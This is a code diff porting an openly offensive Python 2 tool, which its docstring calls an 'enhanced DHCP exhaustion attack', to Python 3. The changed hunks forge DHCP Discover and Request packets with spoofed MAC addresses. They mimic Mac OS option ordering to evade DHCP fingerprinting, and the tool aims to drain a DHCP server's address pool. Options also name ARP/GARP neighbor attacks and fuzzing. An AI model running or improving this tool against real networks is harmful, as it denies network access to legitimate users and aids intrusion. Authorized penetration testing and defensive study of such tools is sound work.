@@ -1,4 +1,4 @@
-#! /usr/bin/env python
+#! /usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
 enhanced DHCP exhaustion attack.
@@ -156,9 +156,9 @@ def checkArgs():
                                                                       "neighbors-attack-release", "neighbors-attack-garp",
                                                                       "fuzz","ipv6","client-src=","color","v6-rapid-commit",
                                                                       "verbosity=","threads=", "show-lease-confirm","request-options="])
-    except getopt.GetoptError, err:
+    except getopt.GetoptError as err:
         # print help information and exit:
-        print str(err)  # will print something like "option -a not recognized"
+        print(str(err))  # will print something like "option -a not recognized"
         usage()
         sys.exit(2)
     for o,a in opts:
@@ -209,7 +209,7 @@ def checkArgs():
                     if len(x) == 2:
                         REQUEST_OPTS += range(int(x[0]),int(x[1]))
                     else:
-                        print "Error in option - request-options"
+                        print("Error in option - request-options")
                         usage()
                         exit()
                 else:
@@ -227,7 +227,7 @@ def checkArgs():
         sys.exit(2)
         
     if conf.verb:
-        print """---------------------[OPTIONS]-----------
+        print("""---------------------[OPTIONS]-----------
         IPv6                            %s
         fuzz                            %s
 
@@ -252,7 +252,7 @@ def checkArgs():
 -----------------------------------------
         """%(MODE_IPv6, MODE_FUZZ, SHOW_ARP, SHOW_ICMP, SHOW_DHCPOPTIONS, SHOW_LEASE_CONFIRM, repr(REQUEST_OPTS),
              TIMEOUT['timer'], TIMEOUT['dos'], TIMEOUT['dhcpip'],
-             DO_GARP, DO_RELEASE, DO_ARP, repr(MAC_LIST), DO_COLOR)
+             DO_GARP, DO_RELEASE, DO_ARP, repr(MAC_LIST), DO_COLOR))
 
 
 def LOG(message=None, type=None):
@@ -309,22 +309,22 @@ def toNum(ip):
 
 
 def get_if_net(iff):
-    for net, msk, gw, iface, addr in read_routes():
-        if (iff == iface and net != 0L):
+    for net, msk, gw, iface, addr, metric in read_routes():
+        if (iff == iface and net != 0):
             return ltoa(net)
     warning("No net address found for iface %s\n" % iff)
 
 
 def get_if_msk(iff):
-    for net, msk, gw, iface, addr in read_routes():
-        if (iff == iface and net != 0L):
+    for net, msk, gw, iface, addr, metric in read_routes():
+        if (iff == iface and net != 0):
             return ltoa(msk)
     warning("No net address found for iface %s\n" % iff)
 
 
 def get_if_ip(iff):
-    for net, msk, gw, iface, addr in read_routes():
-        if (iff == iface and net != 0L):
+    for net, msk, gw, iface, addr, metric in read_routes():
+        if (iff == iface and net != 0):
             return addr
     warning("No net address found for iface %s\n" % iff)
 
@@ -342,9 +342,7 @@ def calcCIDR(mask):
 
 
 def unpackMAC(binmac):
-    mac = binascii.hexlify(binmac)[0:12]
-    blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
-    return ':'.join(blocks)
+    return str2mac(binmac)
 
 
 ##########################################################
@@ -500,7 +498,21 @@ class send_dhcp(threading.Thread):
             # Mac OS options order to avoid DHCP fingerprinting
             myoptions = [
                 ("message-type", "discover"),
-                ("param_req_list", chr(1),chr(121),chr(3),chr(6),chr(15),chr(119),chr(252),chr(95),chr(44),chr(46)),
+                #  Can replace numeric representation with DHCPRevOptions[],
+                #  but not all parameters are defined in scapy.  For full list see:
+                #  https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml
+                ('param_req_list',
+                1, # Subnet Mask DHCPRevOptions["subnet_mask"][0]
+                121, # Classless Satic Route
+                3, # Router DHCPRevOptions["router"][0]
+                6, # Domain Name Server DHCPRevOptions["name_server"][0]
+                15, # Domain Name DHCPRevOptions["domain"][0]
+                119, # Domain Seach
+                252, # Private/Proxy Autodiscovery
+                95, # LDAP
+                44, # NetBIOS over TCP/IP Name Server DHCPRevOptions["NetBIOS_server"][0]
+                46 # NetBIOS over TCP/IP Node Type
+                ),
                 ("max_dhcp_size",1500),
                 ("client_id", chr(1), mac2str(m)),
                 ("lease_time",10000),
@@ -511,7 +523,7 @@ class send_dhcp(threading.Thread):
                 dhcp_discover = v6_build_discover(m,trid=myxid,options=REQUEST_OPTS)
                 LOG(type="-->", message="v6_DHCP_Discover [cid:%s]"%(repr(str(dhcp_discover[DHCP6OptClientId].duid))))
             else:
-                dhcp_discover = Ether(src=mymac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid,flags=0xFFFFFF)/DHCP(options=myoptions)
+                dhcp_discover = Ether(src=mymac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid,flags=0x8000)/DHCP(options=myoptions)
                 LOG(type="-->", message="DHCP_Discover")
             sendPacket(dhcp_discover)
             if TIMEOUT['timer']>0: 
@@ -604,8 +616,10 @@ class sniff_dhcp(threading.Thread):
                                 LOG(type="DEBUG", message=  "\t\t* "+repr(o)  )
                             else:
                                 LOG(type="DEBUG", message=  "\t\t* %s\t%s"%(o[0],o[1:])  )    
+
+                    # ("param_req_list",0) is the equivalent of using DHCPRevOptions["pad"][0]
+                    dhcp_req = Ether(src=mymac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid,flags=0x8000)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list",0),"end"])
                     
-                    dhcp_req = Ether(src=mymac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid,flags=0xFFFFFF)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
                     LOG(type="-->", message= "DHCP_Request "+myip)
                     sendPacket(dhcp_req)
                 elif SHOW_LEASE_CONFIRM and pkt[DHCP] and pkt[DHCP].options[0][1] == 5:
@@ -685,8 +699,8 @@ def main():
     LOG(type="NOTICE", message= "[DONE] DHCP pool exhausted!")
   
 def usage():
-    print __doc__
+    print(__doc__)
     
 if __name__ == '__main__':
     main()
-    print "\n"
+    print("\n")
